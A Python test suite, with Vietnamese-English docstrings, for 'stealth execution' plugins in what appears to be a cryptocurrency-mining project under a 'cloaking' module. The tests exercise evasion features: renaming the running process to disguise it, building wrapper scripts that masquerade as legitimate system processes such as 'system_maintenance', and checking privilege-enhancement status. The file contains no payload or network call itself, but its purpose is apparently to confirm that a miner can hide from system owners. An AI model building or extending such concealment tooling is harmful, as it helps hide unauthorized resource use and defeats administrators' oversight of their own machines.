#!/usr/bin/env python3
"""
**Comprehensive Test Suite for Stealth Execution Enhancements** (Bộ kiểm tra toàn diện cho cải tiến thực thi ẩn)

Tests all enhanced features:
- Hybrid Safe Disguise System (Hệ thống ngụy trang an toàn lai)
- Process Masquerading (Che giấu tiến trình)
- Dynamic Privilege Adaptation (Thích ứng đặc quyền động)
"""
import os
import sys
import time
import logging
import subprocess
from typing import Dict, Any, List
import tempfile

# Add path để import modules
sys.path.insert(0, '/home/azureuser/grok4/app/mining_environment')

try:
    from cpu_plugins.cloaking.stealth_exec import StealthExecution
    from cpu_plugins.cloaking.stealth_plugin import StealthExecutionPlugin
    from cpu_plugins.optimization.mining_integration_adapter import ProcessCommunicationBridge
    from scripts.unified_logging import get_unified_logger
except ImportError as e:
    print(f"❌ Import error: {e}")
    sys.exit(1)

def setup_test_logger() -> logging.Logger:
    """Setup comprehensive test logger"""
    logger = logging.getLogger('stealth_enhancement_test')
    logger.setLevel(logging.DEBUG)
    
    if not logger.handlers:
        # Console handler
        console_handler = logging.StreamHandler(sys.stdout)
        console_formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )
        console_handler.setFormatter(console_formatter)
        logger.addHandler(console_handler)
        
        # File handler for detailed logs
        file_handler = logging.FileHandler('/tmp/stealth_test.log')
        file_formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(funcName)s:%(lineno)d - %(message)s'
        )
        file_handler.setFormatter(file_formatter)
        logger.addHandler(file_handler)
    
    return logger

class StealthEnhancementTester:
    """**Stealth Enhancement Tester** (Trình kiểm tra cải tiến ẩn danh)"""
    
    def __init__(self):
        self.logger = setup_test_logger()
        self.test_results: Dict[str, Dict] = {}
        self.current_pid = os.getpid()
        
    def run_all_tests(self) -> bool:
        """**Run All Tests** (Chạy tất cả kiểm tra) - comprehensive testing suite"""
        self.logger.info("🚀 Starting Comprehensive Stealth Enhancement Tests")
        
        all_passed = True
        
        # Test suite execution order
        test_methods = [
            ("hybrid_safe_disguise", self.test_hybrid_safe_disguise_system),
            ("process_masquerading", self.test_process_masquerading),
            ("privilege_adaptation", self.test_dynamic_privilege_adaptation),
            ("integration_test", self.test_full_integration)
        ]
        
        for test_name, test_method in test_methods:
            try:
                self.logger.info(f"📋 Running test: {test_name}")
                result = test_method()
                self.test_results[test_name] = result
                
                if result['passed']:
                    self.logger.info(f"✅ {test_name}: PASSED")
                else:
                    self.logger.error(f"❌ {test_name}: FAILED - {result.get('error', 'Unknown error')}")
                    all_passed = False
                    
            except Exception as e:
                self.logger.error(f"💥 {test_name}: EXCEPTION - {e}")
                self.test_results[test_name] = {'passed': False, 'error': str(e)}
                all_passed = False
        
        # Generate comprehensive report
        self.generate_test_report()
        
        return all_passed
    
    def test_hybrid_safe_disguise_system(self) -> Dict[str, Any]:
        """Test Hybrid Safe Disguise System implementation"""
        try:
            stealth_exec = StealthExecution(logger=self.logger, comm_rotation_interval=10)
            
            # Test 1: Risk Assessment
            can_disguise, method, risk_level = stealth_exec._assess_disguise_safety(self.current_pid)
            
            if not can_disguise:
                return {'passed': False, 'error': 'Risk assessment failed for own PID'}
            
            # Test 2: Safe disguise execution
            original_name = stealth_exec._get_process_name(self.current_pid)
            success = stealth_exec._change_process_name_safe(self.current_pid, "test-process")
            
            # Test 3: Metrics collection
            metrics = stealth_exec.get_protection_metrics()
            required_metrics = ['disguise_statistics', 'risk_assessment_config']
            
            for metric in required_metrics:
                if metric not in metrics:
                    return {'passed': False, 'error': f'Missing metric: {metric}'}
            
            return {
                'passed': True,
                'details': {
                    'risk_assessment': {'method': method, 'risk_level': risk_level},
                    'disguise_success': success,
                    'metrics_available': list(metrics.keys())
                }
            }
            
        except Exception as e:
            return {'passed': False, 'error': str(e)}
    
    def test_process_masquerading(self) -> Dict[str, Any]:
        """Test Process Masquerading capabilities"""
        try:
            bridge = ProcessCommunicationBridge(logger=self.logger)
            
            # Test 1: Check legitimate process names
            if not hasattr(bridge, 'LEGITIMATE_PROCESS_NAMES'):
                return {'passed': False, 'error': 'LEGITIMATE_PROCESS_NAMES not found'}
            
            if len(bridge.LEGITIMATE_PROCESS_NAMES) == 0:
                return {'passed': False, 'error': 'No legitimate process names configured'}
            
            # Test 2: Create masquerading wrapper
            test_command = ['echo', 'test']
            wrapper_path = bridge.create_masquerading_wrapper(
                test_command, 
                'system_maintenance'
            )
            
            if not wrapper_path:
                return {'passed': False, 'error': 'Failed to create masquerading wrapper'}
            
            # Test 3: Verify wrapper script content
            if not os.path.exists(wrapper_path):
                return {'passed': False, 'error': 'Wrapper script not created'}
            
            # Test 4: Check masquerading status
            status = bridge.get_masquerading_status()
            required_status_keys = ['available_profiles', 'active_processes']
            
            for key in required_status_keys:
                if key not in status:
                    return {'passed': False, 'error': f'Missing status key: {key}'}
            
            # Cleanup
            if os.path.exists(wrapper_path):
                os.unlink(wrapper_path)
            
            return {
                'passed': True,
                'details': {
                    'legitimate_profiles': len(bridge.LEGITIMATE_PROCESS_NAMES),
                    'wrapper_created': True,
                    'status_keys': list(status.keys())
                }
            }
            
        except Exception as e:
            return {'passed': False, 'error': str(e)}
    
    def test_dynamic_privilege_adaptation(self) -> Dict[str, Any]:
        """Test Dynamic Privilege Adaptation capabilities"""
        try:
            plugin = StealthExecutionPlugin()
            
            # Test 1: Initialize plugin
            init_success = plugin.init(engine=None, config={'enhance_privileges': False})
            
            if not init_success:
                return {'passed': False, 'error': 'Plugin initialization failed'}
            
            # Test 2: Check privilege status
            status = plugin.get_privilege_status()
            required_keys = [
                'current_privileges', 
                'enhancement_status', 
                'required_capabilities',
                'sufficient_privileges',
                'privilege_recommendations'
            ]
            
            for key in required_keys:
                if key not in status:
                    return {'passed': False, 'error': f'Missing privilege status key: {key}'}
            
            # Test 3: Verify capabilities detection
            current_privs = status['current_privileges']
            if 'capabilities' not in current_privs:
                return {'passed': False, 'error': 'Capabilities not detected'}
            
            # Test 4: Check recommendations system
            recommendations = status['privilege_recommendations']
            if not isinstance(recommendations, list):
                return {'passed': False, 'error': 'Recommendations not properly formatted'}
            
            return {
                'passed': True,
                'details': {
                    'privilege_status': status,
                    'capabilities_detected': len(current_privs['capabilities']),
                    'recommendations_count': len(recommendations)
                }
            }
            
        except Exception as e:
            return {'passed': False, 'error': str(e)}
    
    def test_full_integration(self) -> Dict[str, Any]:
        """Test full integration of all components"""
        try:
            # Test 1: Create integrated system
            plugin = StealthExecutionPlugin()
            init_success = plugin.init(
                engine=None, 
                config={
                    'enhance_privileges': False,
                    'start_immediately': False,
                    'comm_rotation_interval': 10
                }
            )
            
            if not init_success:
                return {'passed': False, 'error': 'Integrated system initialization failed'}
            
            # Test 2: Apply stealth to current process
            apply_success = plugin.apply(self.current_pid)
            
            # Test 3: Verify stealth executor metrics
            if plugin.stealth_executor:
                metrics = plugin.stealth_executor.get_protection_metrics()
                
                # Check for new metrics
                enhanced_metrics = [
                    'disguise_statistics',
                    'risk_assessment_config',
                    'simulated_disguises'
                ]
                
                for metric in enhanced_metrics:
                    if metric not in metrics:
                        return {'passed': False, 'error': f'Enhanced metric missing: {metric}'}
            
            # Test 4: Create process communication bridge
            bridge = ProcessCommunicationBridge(logger=self.logger)
            bridge_status = bridge.get_masquerading_status()
            
            # Test 5: Stop plugin cleanly
            stop_success = plugin.stop()
            
            return {
                'passed': True,
                'details': {
                    'integration_init': init_success,
                    'stealth_apply': apply_success,
                    'enhanced_metrics': len(enhanced_metrics),
                    'bridge_status': bridge_status,
                    'clean_stop': stop_success
                }
            }
            
        except Exception as e:
            return {'passed': False, 'error': str(e)}
    
    def generate_test_report(self):
        """Generate comprehensive test report"""
        self.logger.info("📊 Generating Test Report")
        
        total_tests = len(self.test_results)
        passed_tests = sum(1 for result in self.test_results.values() if result['passed'])
        failed_tests = total_tests - passed_tests
        
        print("\n" + "="*80)
        print("🧪 STEALTH EXECUTION ENHANCEMENTS - COMPREHENSIVE TEST REPORT")
        print("="*80)
        print(f"Total Tests: {total_tests}")
        print(f"Passed: {passed_tests} ✅")
        print(f"Failed: {failed_tests} ❌")
        print(f"Success Rate: {(passed_tests/total_tests)*100:.1f}%")
        print()
        
        for test_name, result in self.test_results.items():
            status = "✅ PASSED" if result['passed'] else "❌ FAILED"
            print(f"{test_name}: {status}")
            
            if not result['passed']:
                print(f"  Error: {result.get('error', 'Unknown')}")
            elif 'details' in result:
                print(f"  Details: {result['details']}")
            print()
        
        print("="*80)
        print("📋 Test Log Available: /tmp/stealth_test.log")
        print("="*80)

def main():
    """Main test execution"""
    print("🚀 Starting Stealth Execution Enhancements Test Suite")
    
    tester = StealthEnhancementTester()
    success = tester.run_all_tests()
    
    if success:
        print("\n🎉 All tests passed! Stealth enhancements are working correctly.")
        sys.exit(0)
    else:
        print("\n💥 Some tests failed. Check the report above for details.")
        sys.exit(1)

if __name__ == "__main__":
    main()